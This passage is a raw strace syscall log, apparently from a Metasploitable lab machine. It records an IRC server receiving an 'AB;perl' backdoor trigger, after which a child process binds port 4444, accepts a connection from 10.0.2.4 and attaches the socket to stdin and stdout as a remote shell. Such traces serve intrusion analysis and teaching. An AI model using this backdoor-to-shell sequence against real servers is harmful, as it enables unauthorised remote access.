[RFC2406]\nah\t51\tIPSEC-AH\t# Authentication Header [RFC2402]\nskip\t57\tSKIP\t\t# SKIP\nipv6-icmp 58\tIPv6-ICMP\t# ICMP for IPv6\nipv6-nonxt 59\tIPv6-NoNxt\t# No Next Header for IPv6\nipv6-opts 60\tIPv6-Opts\t# Destination Options for IPv6\nrspf\t73\tRSPF CPHB\t# Radio Shortest Path First (officially CPHB)\nvmtp\t81\tVMTP\t\t# Versatile Message Transport\neigrp\t88\tEIGRP\t\t# Enhanced Interior Routing Protocol (Cisco)\nospf\t89\tOSPFIGP\t\t# Open Shortest Path First IGP\nax.25\t93\tAX.25\t\t# AX.25 frames\nipip\t94\tIPIP\t\t# IP-within-IP Encapsulation Protocol\netherip\t97\tETHERIP\t\t# Ethernet-within-IP Encapsulation [RFC3378]\nencap\t98\tENCAP\t\t# Yet Another IP encapsulation [RFC1241]\n#\t99\t\t\t# any private encryption scheme\npim\t103\tPIM\t\t# Protocol Independent Multicast\nipcomp\t108\tIPCOMP\t\t# IP Payload Compression Protocol\nvrrp\t112\tVRRP\t\t# Virtual Router Redundancy Protocol\nl2tp\t115\tL2TP\t\t# Layer Two Tunneling Protocol [RFC2661]\nisis\t124\tISIS\t\t# IS-IS over IPv4\nsctp\t132\tSCTP\t\t# Stream Control Transmission Protocol\nfc\t133\tFC\t\t# Fibre Channel\nudplite\t136\tUDPLite\t\t# UDP-Lite\n\n", 4096) = 2510
8459  07:23:31.545721 close(6)          = 0
8459  07:23:31.545731 munmap(0xb7d16000, 4096) = 0
8459  07:23:31.545759 socket(PF_INET, SOCK_STREAM, IPPROTO_TCP) = 6
8459  07:23:31.545781 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf9dcb88) = -1 EINVAL (Invalid argument)
8459  07:23:31.545794 _llseek(6, 0, 0xbf9dcbd0, SEEK_CUR) = -1 ESPIPE (Illegal seek)
8459  07:23:31.545806 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf9dcb88) = -1 EINVAL (Invalid argument)
8459  07:23:31.545817 _llseek(6, 0, 0xbf9dcbd0, SEEK_CUR) = -1 ESPIPE (Illegal seek)
8459  07:23:31.545827 fcntl64(6, F_SETFD, FD_CLOEXEC) = 0
8459  07:23:31.545891 setsockopt(6, SOL_SOCKET, SO_REUSEADDR, [1], 4) = 0
8459  07:23:31.545952 bind(6, {sa_family=AF_INET, sin_port=htons(4444), sin_addr=inet_addr("0.0.0.0")}, 16) = 0
8459  07:23:31.545995 listen(6, 5)      = 0
8459  07:23:31.546051 accept(6,  <unfinished ...>
8458  07:23:31.552976 exit_group(0)     = ?
8456  07:23:31.553076 <... waitpid resumed> [{WIFEXITED(s) && WEXITSTATUS(s) == 0}], 0) = 8458
8456  07:23:31.553093 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
8456  07:23:31.553104 --- SIGCHLD (Child exited) @ 0 (0) ---
8456  07:23:31.553112 waitpid(-1, 0xbf9e4d58, WNOHANG) = -1 ECHILD (No child processes)
8456  07:23:31.553122 sigreturn()       = ? (mask now [])
8456  07:23:31.553137 rt_sigaction(SIGINT, {SIG_DFL}, {0x807f150, [], 0}, 8) = 0
8456  07:23:31.553179 exit_group(0)     = ?
4519  07:23:31.553215 <... waitpid resumed> [{WIFEXITED(s) && WEXITSTATUS(s) == 0}], 0) = 8456
4519  07:23:31.553227 rt_sigaction(SIGINT, {0x8062280, [HUP INT], 0}, NULL, 8) = 0
4519  07:23:31.553240 rt_sigaction(SIGQUIT, {SIG_IGN}, NULL, 8) = 0
4519  07:23:31.553251 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
4519  07:23:31.553260 --- SIGCHLD (Child exited) @ 0 (0) ---
4519  07:23:31.553278 send(5, ":irc.Metasploitable.LAN 451 AB;perl :You have not registered\r\n", 62, 0) = 62
4519  07:23:31.553334 time(NULL)        = 1495625011
4519  07:23:31.553344 time(NULL)        = 1495625011
4519  07:23:31.553357 gettimeofday({1495625011, 553381}, NULL) = 0
4519  07:23:31.553435 select(1024, [2], [], NULL, {0, 0}) = 0 (Timeout)
4519  07:23:31.553504 clock_gettime(CLOCK_MONOTONIC, {1821, 370517101}) = 0
4519  07:23:31.553531 gettimeofday({1495625011, 553535}, NULL) = 0
4519  07:23:31.553542 select(1024, [2 3 4 7 9], [], NULL, {1, 0}) = 1 (in [9], left {0, 810000})
4519  07:23:31.742577 clock_gettime(CLOCK_MONOTONIC, {1821, 559598728}) = 0
4519  07:23:31.742603 recv(9, "PRIVMSG  #testit3 ABCDEFGHIJKLMNOPQRSTUVWXYZ\n", 8192, 0) = 45
4519  07:23:31.742632 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 310000}, ...}) = 0
4519  07:23:31.742649 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 310000}, ...}) = 0
4519  07:23:31.742664 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 310000}, ...}) = 0
4519  07:23:31.742678 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 310000}, ...}) = 0
4519  07:23:31.742691 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 310000}, ...}) = 0
4519  07:23:31.742704 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 310000}, ...}) = 0
4519  07:23:31.742717 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 310000}, ...}) = 0
4519  07:23:31.742731 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 310000}, ...}) = 0
4519  07:23:31.742751 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 310000}, ...}) = 0
4519  07:23:31.742765 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 310000}, ...}) = 0
4519  07:23:31.742778 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 310000}, ...}) = 0
4519  07:23:31.742791 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 310000}, ...}) = 0
4519  07:23:31.742804 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 310000}, ...}) = 0
4519  07:23:31.742817 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 310000}, ...}) = 0
4519  07:23:31.742830 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 310000}, ...}) = 0
4519  07:23:31.742844 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 310000}, ...}) = 0
4519  07:23:31.742857 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 310000}, ...}) = 0
4519  07:23:31.742870 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 310000}, ...}) = 0
4519  07:23:31.742883 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 310000}, ...}) = 0
4519  07:23:31.742898 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 310000}, ...}) = 0
4519  07:23:31.742912 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 310000}, ...}) = 0
4519  07:23:31.742925 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 310000}, ...}) = 0
4519  07:23:31.742958 gettimeofday({1495625011, 742991}, NULL) = 0
4519  07:23:31.743000 select(1024, [2 3 4 5 7 9], [], NULL, {1, 0} <unfinished ...>
8459  07:23:31.862488 <... accept resumed> {sa_family=AF_INET, sin_port=htons(38067), sin_addr=inet_addr("10.0.2.4")}, [16]) = 8
4519  07:23:31.862521 <... select resumed> ) = 1 (in [5], left {0, 880000})
8459  07:23:31.862547 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS <unfinished ...>
4519  07:23:31.862554 clock_gettime(CLOCK_MONOTONIC,  <unfinished ...>
8459  07:23:31.862561 <... ioctl resumed> , 0xbf9dbb78) = -1 EINVAL (Invalid argument)
4519  07:23:31.862568 <... clock_gettime resumed> {1821, 679567201}) = 0
8459  07:23:31.862579 _llseek(8, 0,  <unfinished ...>
4519  07:23:31.862585 recv(5,  <unfinished ...>
8459  07:23:31.862592 <... _llseek resumed> 0xbf9dbbc0, SEEK_CUR) = -1 ESPIPE (Illegal seek)
4519  07:23:31.862597 <... recv resumed> 0x80b7ec0, 8192, 0) = -1 ECONNRESET (Connection reset by peer)
8459  07:23:31.862607 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS <unfinished ...>
4519  07:23:31.862613 getsockopt(5, SOL_SOCKET, SO_ERROR <unfinished ...>
8459  07:23:31.862620 <... ioctl resumed> , 0xbf9dbb78) = -1 EINVAL (Invalid argument)
4519  07:23:31.862625 <... getsockopt resumed> , [0], [4]) = 0
8459  07:23:31.862642 _llseek(8, 0,  <unfinished ...>
4519  07:23:31.862649 send(5, "ERROR :Closing Link: [10.0.2.4] (Connection reset by peer)\r\n", 60, 0 <unfinished ...>
8459  07:23:31.862661 <... _llseek resumed> 0xbf9dbbc0, SEEK_CUR) = -1 ESPIPE (Illegal seek)
4519  07:23:31.862666 <... send resumed> ) = -1 EPIPE (Broken pipe)
8459  07:23:31.862674 fcntl64(8, F_SETFD, FD_CLOEXEC <unfinished ...>
4519  07:23:31.862679 --- SIGPIPE (Broken pipe) @ 0 (0) ---
8459  07:23:31.862716 <... fcntl64 resumed> ) = 0
4519  07:23:31.862722 close(5 <unfinished ...>
8459  07:23:31.862759 close(6 <unfinished ...>
4519  07:23:31.862764 <... close resumed> ) = 0
8459  07:23:31.862777 <... close resumed> ) = 0
4519  07:23:31.862782 time( <unfinished ...>
8459  07:23:31.862840 dup(8 <unfinished ...>
4519  07:23:31.862846 <... time resumed> NULL) = 1495625011
8459  07:23:31.862853 <... dup resumed> ) = 6
4519  07:23:31.862858 time( <unfinished ...>
8459  07:23:31.862865 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS <unfinished ...>
4519  07:23:31.862869 <... time resumed> NULL) = 1495625011
8459  07:23:31.862879 <... ioctl resumed> , 0xbf9dca18) = -1 EINVAL (Invalid argument)
4519  07:23:31.862884 gettimeofday( <unfinished ...>
8459  07:23:31.862891 _llseek(6, 0,  <unfinished ...>
4519  07:23:31.862895 <... gettimeofday resumed> {1495625011, 862887}, NULL) = 0
8459  07:23:31.862904 <... _llseek resumed> 0xbf9dca60, SEEK_CUR) = -1 ESPIPE (Illegal seek)
4519  07:23:31.862916 select(1024, [2], [], NULL, {0, 0} <unfinished ...>
8459  07:23:31.862943 fstat64(6,  <unfinished ...>
4519  07:23:31.862948 <... select resumed> ) = 0 (Timeout)
8459  07:23:31.862968 <... fstat64 resumed> {st_mode=S_IFSOCK|0777, st_size=0, ...}) = 0
4519  07:23:31.863010 clock_gettime(CLOCK_MONOTONIC,  <unfinished ...>
8459  07:23:31.863019 dup2(6, 1 <unfinished ...>
4519  07:23:31.863023 <... clock_gettime resumed> {1821, 680023203}) = 0
8459  07:23:31.863046 <... dup2 resumed> ) = 1
4519  07:23:31.863051 gettimeofday( <unfinished ...>
8459  07:23:31.863058 close(6 <unfinished ...>
4519  07:23:31.863062 <... gettimeofday resumed> {1495625011, 863054}, NULL) = 0
8459  07:23:31.863070 <... close resumed> ) = 0
4519  07:23:31.863075 select(1024, [2 3 4 7 9], [], NULL, {1, 0} <unfinished ...>
8459  07:23:31.863104 fcntl64(1, F_SETFD, 0) = 0
8459  07:23:31.863115 ioctl(1, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf9dc9e8) = -1 EINVAL (Invalid argument)
8459  07:23:31.863126 _llseek(1, 0, 0xbf9dca30, SEEK_CUR) = -1 ESPIPE (Illegal seek)
8459  07:23:31.863158 dup(8)            = 6
8459  07:23:31.863171 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf9dca18) = -1 EINVAL (Invalid argument)
8459  07:23:31.863181 _llseek(6, 0, 0xbf9dca60, SEEK_CUR) = -1 ESPIPE (Illegal seek)
8459  07:23:31.863191 fstat64(6, {st_mode=S_IFSOCK|0777, st_size=0, ...}) = 0
8459  07:23:31.863208 dup2(6, 0)        = 0
8459  07:23:31.863218 close(6)          = 0
8459  07:23:31.863227 fcntl64(0, F_SETFD, 0) = 0
8459  07:23:31.863241 fcntl64(0, F_SETFD, 0) = 0
8459  07:23:31.863257 read(0, "", 4096) = 0
8459  07:23:32.377201 close(8)          = 0
8459  07:23:32.377350 exit_group(0)     = ?
